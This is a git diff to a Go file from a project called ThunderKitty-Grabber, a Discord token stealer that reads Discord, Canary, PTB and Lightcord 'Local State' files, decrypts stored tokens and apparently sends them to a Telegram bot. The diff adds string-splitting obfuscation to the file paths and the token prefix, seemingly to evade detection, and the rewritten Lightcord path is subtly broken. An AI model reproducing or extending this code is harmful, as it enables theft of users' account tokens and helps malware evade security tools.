@@ -2,13 +2,12 @@ package TokenGrabber
 
 import (
 	"ThunderKitty-Grabber/utils/browsers"
-	"ThunderKitty-Grabber/utils/telegramsend"
+	requests "ThunderKitty-Grabber/utils/telegramsend"
 	"bufio"
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/shirou/gopsutil/v3/disk"
 	"io"
 	"net/http"
 	"net/url"
@@ -17,6 +16,8 @@ import (
 	"regexp"
 	"strings"
 	"syscall"
+
+	"github.com/shirou/gopsutil/v3/disk"
 )
 
 var (
@@ -118,10 +119,10 @@ func Run(botToken, chatID string, dmMessage string) {
 	SetTelegramCredentials(botToken, chatID)
 	var Tokens map[string]map[string]string
 	discordPaths := map[string]string{
-		"Discord":        "\\discord\\Local State",
-		"Discord Canary": "\\discordcanary\\Local State",
-		"Lightcord":      "\\lightcord\\Local State",
-		"Discord PTB":    "\\discordptb\\Local State",
+		"Di" + "sc" + "ord":                    "\\di" + "sco" + "rd " + "\\Loc" + "al St" + "ate",
+		"Dis" + "c" + "or" + "d Canary":        "\\disc" + "ordc" + "anar" + "y\\Lo" + "cal S" + "tate",
+		"Lig" + "htc" + "ord":                  "\\lig" + "htco" + "rd\\L" + "ocal " + "tate",
+		"Di" + "sc" + "or" + "d " + "PT" + "B": "\\di" + "scor" + "dptb\\" + "Loc" + "al " + "Sta" + "te",
 	}
 
 	Tokens = make(map[string]map[string]string)
@@ -161,7 +162,7 @@ func Run(botToken, chatID string, dmMessage string) {
 				}
 
 				for _, match := range Regexp.FindAllString(data, -1) {
-					encodedPass, err := base64.StdEncoding.DecodeString(strings.Split(match, "dQw4w9WgXcQ:")[1])
+					encodedPass, err := base64.StdEncoding.DecodeString(strings.Split(match, "dQ"+"w4w"+"9Wg"+"Xc"+"Q:")[1])
 					if err != nil {
 						continue
 					}
